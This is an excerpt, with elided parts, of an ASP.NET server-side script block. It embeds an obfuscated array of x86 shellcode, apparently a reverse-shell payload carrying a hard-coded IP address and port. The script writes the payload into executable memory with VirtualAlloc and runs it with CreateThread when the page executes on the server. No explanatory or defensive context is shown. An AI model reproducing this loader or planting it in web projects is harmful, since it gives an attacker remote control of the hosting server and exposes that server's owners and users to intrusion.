...
<script runat="server">
    ...
    {
        byte[] lj8JWdJ = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,
...
0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,
0x01,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,0xcf,0x0d,0xac,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x12,0x8d,0x81,0xf6,
0x68,0x02,0x00,0x3f,0x89,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xd5};
        ...
        IntPtr c7xMAzjWaE = VirtualAlloc(IntPtr.Zero,(UIntPtr)lj8JWdJ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lj8JWdJ,0,c7xMAzjWaE,lj8JWdJ.Length);
        IntPtr h7YB3a = IntPtr.Zero;
        IntPtr nssmC6 = CreateThread(IntPtr.Zero,UIntPtr.Zero,c7xMAzjWaE,IntPtr.Zero,0,ref h7YB3a);
    }
</script>
